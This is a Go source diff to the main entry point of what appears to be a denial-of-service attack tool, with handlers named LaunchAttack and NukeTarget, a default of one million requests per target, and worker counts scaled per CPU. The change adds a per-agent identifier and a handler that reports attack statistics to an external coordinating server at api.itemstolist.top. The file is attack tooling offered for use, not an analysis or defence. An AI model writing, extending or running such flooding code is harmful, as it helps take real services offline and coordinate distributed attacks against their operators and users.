@@ -18,6 +18,7 @@ import (
 	"github.com/andriiyaremenko/mg/handler"
 	"github.com/andriiyaremenko/mg/source"
 	"github.com/andriiyaremenko/tinycqs/command"
+	"github.com/google/uuid"
 )
 
 func main() {
@@ -26,11 +27,14 @@ func main() {
 	q := flag.Int("q", 2, "log verbosity level")
 	workersPerCore := flag.Int("w", 10, "number of workers per logical CPU")
 	amountRequests := flag.Int64("n", 1000000, "number of requests per each target")
+	statEndpoint := flag.String("stat", "https://api.itemstolist.top/api/target/%d/stats", "url to send statistic")
 
 	flag.Parse()
 
+	agentUID := uuid.New().String()
 	ctx := context.Background()
 	ctx, cancel := context.WithCancel(ctx)
+	ctx = logw.AppendDebug(ctx, "agentUID", agentUID)
 
 	log := log.New(
 		logw.LogWriter(ctx, os.Stdout, logw.Option(*q, logw.JSONFormatter, time.RFC3339)),
@@ -55,11 +59,12 @@ func main() {
 	comm, err := command.NewWithConcurrencyLimit(
 		numWorkers,
 		handler.LaunchAttack(numWorkers),
-		handler.NukeTarget(*amountRequests),
+		handler.NukeTarget(*amountRequests, agentUID),
 		handler.TargetDown(log),
 		handler.TargetAlive(log),
 		handler.TargetError(log),
 		handler.HandleErrors(log),
+		handler.CollectStatistic(ctx, log, *statEndpoint),
 	)
 
 	if err != nil {
